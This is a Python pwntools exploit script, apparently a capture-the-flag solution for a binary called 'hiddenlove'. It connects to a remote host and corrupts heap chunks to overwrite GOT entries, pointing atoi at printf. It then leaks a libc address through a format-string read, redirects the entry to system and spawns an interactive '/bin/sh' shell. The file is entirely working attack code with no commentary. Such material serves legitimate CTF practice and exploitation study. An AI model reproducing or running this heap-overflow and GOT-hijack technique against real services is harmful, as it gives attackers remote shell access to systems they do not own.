#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
mode = 'remote'
# mode = 'local'
if mode == 'local':
   R = process('hiddenlove')
else:
   R = remote('106.75.84.68',20000)

R.recvuntil('4.Just throw yourself at her feet\n')
def alloc(length,word,name):
   R.sendline('1')
   R.recvuntil('how many words do you wanna say with her(0~1000)')
   R.send('%d\n'%length)
   R.recvuntil('write what you wanna to say with her')
   R.send(word)
   R.recvuntil('now tell me her name')
   R.send(name)
   R.recvuntil('4.Just throw yourself at her feet\n')

def edit(word):
   R.sendline('2\n\x00')
   R.recvuntil('Don\'t be shy, make her know your feelings')
   R.send(word)
   R.recvuntil('4.Just throw yourself at her feet\n')

def free():
   R.sendline('3')
   R.recvuntil('4.Just throw yourself at her feet\n')

def malloc(size):
   R.sendline('4')
   R.recvuntil('(Y/N)')
   R.send('N'+'\x00'*(size-1)+'\x50'+'\x00')
context.log_level='debug'
printf_addr = 0x4006F0
alarm_addr = 0x400700
exit_addr = 0x400760
atoi_addr = 0x400740
read_addr = 0x602048

malloc(0xfe8)
R.recvuntil('4.Just throw yourself at her feet\n')
alloc(0x80,'a'*8+p64(0x91)+p64(0)+p64(0x21),p64(0x50))
free()
alloc(0x40,'1'*0x30+p64(0x602060),'aaa')
edit(p64(printf_addr)+p64(0)+p64(alarm_addr))
R.send('%7$s'+'\x00'*4+p64(read_addr))
read_addr = int(R.recv(6)[::-1].encode('hex'),16)
print 'read_add: %lx'%read_addr
if mode == 'remote':
   elf = ELF('./libc.so.6')
else:
   elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_addr = read_addr-elf.symbols['read']
system_addr = libc_addr+elf.symbols['system']
print 'libc_addr: %lx'%libc_addr
print 'system_addr: %lx'%system_addr
edit(p64(system_addr))

R.send('/bin/sh\x00')
R.interactive()